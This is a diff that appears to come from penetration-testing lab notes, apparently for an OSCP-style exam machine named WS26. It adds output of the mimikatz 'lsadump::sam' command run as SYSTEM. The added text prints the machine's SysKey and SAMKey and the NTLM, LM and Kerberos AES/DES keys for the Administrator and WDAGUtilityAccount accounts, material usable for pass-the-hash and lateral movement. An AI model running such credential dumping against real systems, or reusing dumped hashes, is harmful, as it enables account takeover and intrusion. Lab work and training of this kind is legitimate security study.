@@ -39,7 +39,80 @@ SID name  : NT AUTHORITY\SYSTEM
 mimikatz # sekurlsa::logonpasswords
 ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
 
-mimikatz #
+mimikatz # lsadump::sam
+Domain : WS26
+SysKey : 6efca182500dc518f4c19cf5341a30d4
+Local SID : S-1-5-21-2756297892-2186407355-380279769
+
+SAMKey : 24426470f121aa90530be4b3c19d878b
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 6d2907763f2fdae4099a65bdb012045c
+    lm  - 0: 407b7adefdd553a2de47fb9811116f29
+    ntlm- 0: 6d2907763f2fdae4099a65bdb012045c
+    ntlm- 1: 6d2907763f2fdae4099a65bdb012045c
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e7d88aabdeda8a50b6c8bd4ea585dd44
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WS26.OSCP.EXAMAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : e9f31a70b7ddcdd063ba3f337a9d58bf2103f34602f47b51a57465253ab811bd
+      aes128_hmac       (4096) : d936e790bfe354dc5357fbca7f15b778
+      des_cbc_md5       (4096) : 9b98987002327fce
+    OldCredentials
+      aes256_hmac       (4096) : 18e95cb5dfb458db5c3202bdd5045ed141a70a2af39860d1042113ab3fa3f9ad
+      aes128_hmac       (4096) : 45290fc8d9c01413cef0a27ccc91f347
+      des_cbc_md5       (4096) : 5d8525c8d6ab9d52
+    OlderCredentials
+      aes256_hmac       (4096) : 53c7cdd42d708d6ec10e1c7814c62167bad6454ea6dc42d9e5c1bb8ab7b9d79d
+      aes128_hmac       (4096) : ea7898e7e9d3e319005056b9e5f7dd43
+      des_cbc_md5       (4096) : 91ce9dab57548f0b
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WS26.OSCP.EXAMAdministrator
+    Credentials
+      des_cbc_md5       : 9b98987002327fce
+    OldCredentials
+      des_cbc_md5       : 5d8525c8d6ab9d52
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 5403e400be738dd915e176be5da78216
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : aedf7c3484786b0b08c3cf5390100e59
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : fde783dddc7dba274cdb578e91c742114e263fda3f85d2de370b2094d1de0bc0
+      aes128_hmac       (4096) : ded4018116eea7e5616be59ae6ffe2e2
+      des_cbc_md5       (4096) : eca497e5c275648c
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : eca497e5c275648c
 ```
 
 ---
